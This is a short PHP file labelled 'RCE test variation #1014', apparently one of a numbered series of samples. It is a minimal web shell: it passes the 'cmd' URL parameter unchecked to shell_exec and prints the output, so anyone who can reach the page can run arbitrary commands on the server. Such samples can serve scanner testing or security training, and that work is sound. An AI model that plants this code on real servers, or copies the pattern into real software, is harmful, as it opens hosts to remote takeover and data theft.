<?php
// RCE test variation #1014
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>